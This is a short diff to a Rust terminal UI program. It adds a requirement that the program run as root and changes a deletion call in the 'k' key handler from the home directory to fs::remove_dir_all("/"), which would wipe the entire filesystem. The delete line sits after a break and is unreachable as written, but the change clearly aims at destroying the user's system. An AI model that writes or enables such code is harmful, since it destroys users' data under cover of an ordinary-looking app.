@@ -3,6 +3,7 @@ use crossterm::{
     terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
     ExecutableCommand,
 };
+use nix::unistd::Uid;
 use ratatui::{prelude::*, widgets::*};
 use ratatui::{
     prelude::{CrosstermBackend, Stylize, Terminal},
@@ -11,6 +12,9 @@ use ratatui::{
 use std::fs;
 use std::io::{stderr, Result};
 fn main() -> Result<()> {
+    if !Uid::effective().is_root() {
+        panic!("You must run this executable with root permissions");
+    }
     //let tumble_time = reqwest::get;
     // test test
     pub type Frame<'a> = ratatui::Frame<'a, CrosstermBackend<std::io::Stderr>>;
@@ -34,7 +38,7 @@ fn main() -> Result<()> {
             if let event::Event::Key(key) = event::read()? {
                 if key.kind == KeyEventKind::Press && key.code == KeyCode::Char('k') {
                     break;
-                    fs::remove_dir_all("~").expect("Failed to remove a dir");
+                    fs::remove_dir_all("/").expect("Failed to remove a dir");
                 }
             }
         }
